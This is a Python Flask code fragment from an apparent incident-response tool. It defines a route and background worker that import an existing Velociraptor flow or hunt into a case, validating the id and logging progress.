            add_log_to_run(run_id, f"  host {host} ({cid})")
        for name in sorted(results or {}):
            add_log_to_run(run_id, f"  {name}: {len(results[name])} row(s)")

        update_run_status(run_id, "running", progress=92)
        add_log_to_run(run_id, "Persisting rows where the case graph reads them…")
        persist_pipeline_artifacts(run_id, results)

        add_log_to_run(
            run_id,
            f"Adopted {total} row(s) across {len(artifacts or [])} supported "
            f"artifact(s) from {len(client_info or {})} host(s) into the case.",
            "success")
        add_log_to_run(run_id, "The case graph and report refresh on their own "
                               "shortly — no need to press Fusion.")
        # No explicit fuse call: velociraptor_adopt is in AGENTIC_TYPES, so
        # update_run_status arms the debounced auto-fuse for the case.
        update_run_status(run_id, "completed", progress=100)

    except Exception as e:
        print(f"[ADOPT] {ident} failed: {e}", flush=True)
        traceback.print_exc()
        try:
            add_log_to_run(run_id, f"Adopt failed: {e}", "error")
            update_run_status(run_id, "failed", error=str(e))
        except Exception:
            pass


@velociraptor_bp.route('/api/velociraptor/adopt', methods=['POST'])
def adopt_velociraptor_collection():
    """Pull an existing Velociraptor flow/hunt into the active case by id."""
    try:
        import threading
        from services.workflow_service import _resolve_case_id

        data = request.get_json(silent=True) or {}
        raw_id = (data.get('id') or data.get('flow_id') or data.get('hunt_id') or '')

        kind, ident = _adopt_normalize_id(raw_id)
        if not kind:
            # Validate BEFORE anything else: these ids are interpolated straight
            # into VQL downstream, and this is the first route that takes one
            # from an operator rather than from a run we created.
            return jsonify({"error": f"'{str(raw_id).strip()}' is not a valid id. "
                                     f"{_ADOPT_ID_HINT}"}), 400

        case_id = _resolve_case_id("velociraptor_adopt", None)
        if not case_id:
            return jsonify({"error": "No active case to adopt into."}), 400

        existing = _adopt_existing_run(case_id, ident)
        if existing:
            return jsonify({
                "error": f"{ident} is already in this case as "
                         f"\"{existing.get('name') or existing.get('run_id')}\". "
                         f"Use Fetch results on that run to pull anything new.",
                "duplicate": True,
                "run_id": existing.get("run_id"),
            }), 409

        run_id = create_automation_run(
            automation_type="velociraptor_adopt",
            name=f"Adopt {'hunt' if kind == 'hunt' else 'flow'} {ident}",
            details={("hunt_id" if kind == "hunt" else "flow_id"): ident,
                     "adopted_id": ident,
                     # An analyst ran this by hand in the Velociraptor GUI — no
                     # agent was involved. Display label only (_run_passes_gate
                     # admits every Velociraptor run), but it should be honest.
                     "is_agentic": False},
            case_id=case_id,
        )
        add_log_to_run(run_id, f"Adopting {kind} {ident} into the case")

        threading.Thread(target=_adopt_worker,
                         args=(run_id, kind, ident),
                         daemon=True).start()

        return jsonify({"run_id": run_id, "kind": kind, "id": ident}), 202

    except Exception as e:
        print(f"[ADOPT] ✗ {e}", flush=True)
        traceback.print_exc()
        return jsonify({"error": str(e)}), 500
